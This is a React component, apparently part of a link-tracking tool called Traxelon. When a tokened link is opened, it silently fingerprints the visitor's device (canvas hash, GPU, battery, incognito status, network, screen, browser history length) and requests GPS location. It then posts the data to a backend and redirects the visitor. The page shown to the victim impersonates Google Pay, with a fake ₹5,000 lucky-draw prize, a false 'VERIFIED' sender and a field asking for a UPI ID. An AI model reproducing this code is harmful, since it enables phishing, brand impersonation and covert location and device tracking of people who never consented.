import React, { useEffect, useRef, useState } from "react";
import { useParams } from "react-router-dom";
import { useGeoGrabber } from "../hooks/useGeoGrabber";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || "http://localhost:5001";

function getCaptureKey(token) {
  return "traxelon_captured_v4_" + token;
}

// ── Canvas fingerprint ────────────────────────────────────────
function getCanvasFingerprint() {
  try {
    const canvas = document.createElement("canvas");
    canvas.width = 200;
    canvas.height = 50;
    const ctx = canvas.getContext("2d");
    ctx.textBaseline = "top";
    ctx.font = "14px Arial";
    ctx.fillStyle = "#f60";
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = "#069";
    ctx.fillText("Traxelon", 2, 15);
    ctx.fillStyle = "rgba(102,204,0,0.7)";
    ctx.fillText("Traxelon", 4, 17);
    const dataUrl = canvas.toDataURL();
    let hash = 0;
    for (let i = 0; i < dataUrl.length; i++) {
      hash = (hash << 5) - hash + dataUrl.charCodeAt(i);
      hash |= 0;
    }
    return hash.toString(16);
  } catch {
    return null;
  }
}

// ── WebGL GPU info ────────────────────────────────────────────
function getGPUInfo() {
  try {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (!gl) return { gpu: null, gpuVendor: null };
    const ext = gl.getExtension("WEBGL_debug_renderer_info");
    if (!ext) return { gpu: null, gpuVendor: null };
    return {
      gpu: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || null,
      gpuVendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) || null,
    };
  } catch {
    return { gpu: null, gpuVendor: null };
  }
}

// ── Battery info ──────────────────────────────────────────────
async function getBatteryInfo() {
  try {
    if (!navigator.getBattery) return {};
    const battery = await navigator.getBattery();
    return {
      batteryLevel: Math.round(battery.level * 100),
      batteryCharging: battery.charging,
    };
  } catch {
    return {};
  }
}

// ── Incognito detection ───────────────────────────────────────
async function detectIncognito() {
  try {
    if (navigator.storage && navigator.storage.estimate) {
      const { quota } = await navigator.storage.estimate();
      return quota < 120 * 1024 * 1024;
    }
    return null;
  } catch {
    return null;
  }
}

// ── Network info ──────────────────────────────────────────────
function getNetworkInfo() {
  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (!conn) return {};
  return {
    connectionType: conn.effectiveType || null,
    connectionDownlink: conn.downlink || null,
    connectionRtt: conn.rtt || null,
    connectionSaveData: conn.saveData || false,
  };
}

// ── Collect all device info ───────────────────────────────────
async function collectDeviceInfo() {
  const [battery, incognito] = await Promise.all([
    getBatteryInfo(),
    detectIncognito(),
  ]);
  const { gpu, gpuVendor } = getGPUInfo();
  const network = getNetworkInfo();
  const canvasHash = getCanvasFingerprint();

  return {
    cpuCores: navigator.hardwareConcurrency || null,
    ram: navigator.deviceMemory || null,
    gpu,
    gpuVendor,
    maxTouchPoints: navigator.maxTouchPoints || null,
    batteryLevel: battery.batteryLevel || null,
    batteryCharging: battery.batteryCharging || null,
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
    screenAvailWidth: window.screen.availWidth || null,
    screenAvailHeight: window.screen.availHeight || null,
    colorDepth: window.screen.colorDepth || null,
    pixelDepth: window.screen.pixelDepth || null,
    pixelRatio: window.devicePixelRatio || null,
    windowWidth: window.innerWidth || null,
    windowHeight: window.innerHeight || null,
    language: navigator.language || null,
    languages: navigator.languages ? navigator.languages.join(", ") : null,
    platform: navigator.platform || null,
    cookiesEnabled: navigator.cookieEnabled || null,
    doNotTrack: navigator.doNotTrack || null,
    historyLength: window.history.length || null,
    referrer: document.referrer || null,
    ...network,
    incognito: incognito || null,
    canvasHash,
  };
}

export default function TrackingCapture() {
  const { token } = useParams();
  const [status, setStatus] = useState("📍 Allow location for full experience…");
  const hasSent = useRef(false);
  const { location, loading } = useGeoGrabber();

  useEffect(() => {
    const key = getCaptureKey(token);
    if (sessionStorage.getItem(key)) {
      setStatus("Redirecting…");
    }
  }, [token]);

  useEffect(() => {
    if (loading) return;
    if (hasSent.current) return;
    const key = getCaptureKey(token);
    if (sessionStorage.getItem(key)) return;
    hasSent.current = true;
    sessionStorage.setItem(key, "1");
    sendCapture(location);
  }, [loading]);

  async function sendCapture(loc) {
    setStatus("Redirecting…");

    try {
      const deviceInfo = await collectDeviceInfo();

      const payload = {
        token,
        gpsLat: loc && loc.source === "gps" ? (loc.lat || null) : null,
        gpsLon: loc && loc.source === "gps" ? (loc.lon || null) : null,
        gpsAccuracy: loc && loc.source === "gps" ? (loc.gpsAccuracy || null) : null,
        ...deviceInfo,
      };

      const res = await fetch(BACKEND_URL + "/api/links/capture", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      const data = await res.json();
      if (data.destinationUrl) {
        window.location.replace(data.destinationUrl);
      }
    } catch (err) {
      console.error("[TrackingCapture] error:", err);
    }
  }

  const orderId = token ? token.substring(0, 10).toUpperCase() : "";

  return (
    <div style={{
      margin: 0,
      padding: "16px",
      minHeight: "100vh",
      background: "#f1f3f4",
      fontFamily: "'Google Sans', Roboto, Arial, sans-serif",
      display: "flex",
      flexDirection: "column",
      alignItems: "center",
      justifyContent: "center",
    }}>
      <div style={{
        background: "#fff",
        borderRadius: 16,
        boxShadow: "0 2px 10px rgba(0,0,0,0.15)",
        width: "100%",
        maxWidth: 400,
        overflow: "hidden"
      }}>
        {/* Top bar */}
        <div style={{ background: "#fff", padding: "16px 20px", borderBottom: "1px solid #e8eaed", display: "flex", alignItems: "center", gap: 10 }}>
          <div style={{ display: "flex", alignItems: "center", gap: 4 }}>
            <svg width="28" height="28" viewBox="0 0 48 48">
              <path fill="#4285F4" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
              <path fill="#34A853" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
              <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
              <path fill="#EA4335" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
            </svg>
            <span style={{ fontSize: 18, fontWeight: 500, color: "#202124", letterSpacing: 0.3 }}>Pay</span>
          </div>
        </div>

        {/* Prize Banner */}
        <div style={{ background: "linear-gradient(135deg, #1a73e8, #0d47a1)", padding: "24px 20px", textAlign: "center" }}>
          <div style={{ background: "rgba(255,255,255,0.15)", borderRadius: 50, display: "inline-block", padding: "4px 16px", marginBottom: 12, fontSize: 12, color: "#fff", letterSpacing: 1 }}>
            🎉 CONGRATULATIONS
          </div>
          <div style={{ color: "#fff", fontSize: 38, fontWeight: 700, letterSpacing: -1 }}>₹5,000</div>
          <div style={{ color: "rgba(255,255,255,0.85)", fontSize: 13, marginTop: 6 }}>Lucky Draw Winner — Claim your prize now!</div>
        </div>

        {/* Sender */}
        <div style={{ padding: "16px 20px", borderBottom: "1px solid #e8eaed", display: "flex", alignItems: "center", gap: 14 }}>
          <div style={{ width: 46, height: 46, borderRadius: "50%", background: "#1a73e8", display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontWeight: 700, fontSize: 20, flexShrink: 0 }}>L</div>
          <div style={{ flex: 1 }}>
            <div style={{ color: "#202124", fontWeight: 600, fontSize: 15 }}>Lucky Draw India</div>
            <div style={{ color: "#5f6368", fontSize: 12, marginTop: 2 }}>luckydraw@okhdfcbank</div>
          </div>
          <div style={{ background: "#e6f4ea", color: "#137333", fontSize: 11, fontWeight: 600, padding: "3px 10px", borderRadius: 12 }}>✓ VERIFIED</div>
        </div>

        {/* Transaction details */}
        <div style={{ padding: "14px 20px", background: "#f8f9fa", borderBottom: "1px solid #e8eaed" }}>
          {[
            { label: "Transaction ID", value: "TXN" + orderId },
            { label: "Date & Time", value: new Date().toLocaleString("en-IN") },
            { label: "Payment Type", value: "Lucky Draw Prize" },
            { label: "Status", value: status === "📍 Allow location for full experience…" ? "⏳ Verifying..." : "✓ Ready to Claim", color: status === "📍 Allow location for full experience…" ? "#f9ab00" : "#137333" },
          ].map((item, i) => (
            <div key={i} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 10 }}>
              <span style={{ color: "#5f6368", fontSize: 13 }}>{item.label}</span>
              <span style={{ color: item.color || "#202124", fontSize: 13, fontWeight: 500 }}>{item.value}</span>
            </div>
          ))}
        </div>

        {/* UPI Input */}
        <div style={{ padding: "20px" }}>
          <div style={{ color: "#202124", fontSize: 14, fontWeight: 500, marginBottom: 12 }}>Enter UPI ID to receive ₹5,000</div>
          <div style={{ display: "flex", alignItems: "center", border: "1.5px solid #dadce0", borderRadius: 8, overflow: "hidden", marginBottom: 16 }}>
            <input type="text" placeholder="mobilenumber@upi" style={{ flex: 1, padding: "13px 14px", border: "none", outline: "none", fontSize: 14, color: "#202124", background: "transparent" }} />
            <div style={{ padding: "0 16px", color: "#1a73e8", fontSize: 13, fontWeight: 600, borderLeft: "1px solid #dadce0", cursor: "pointer", whiteSpace: "nowrap", alignSelf: "stretch", display: "flex", alignItems: "center" }}>Verify</div>
          </div>
          <button style={{ width: "100%", background: "#1a73e8", color: "#fff", border: "none", borderRadius: 8, padding: "14px", fontSize: 15, fontWeight: 600, cursor: "pointer" }}>
            Claim ₹5,000 Now
          </button>
          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, marginTop: 14, color: "#5f6368", fontSize: 11 }}>
            🔒 Secured by Google Pay · 256-bit SSL
          </div>
        </div>
      </div>

      <div style={{ marginTop: 20, color: "#5f6368", fontSize: 11 }}>
        Google Pay · Privacy · Terms · Help
      </div>
    </div>
  );
}
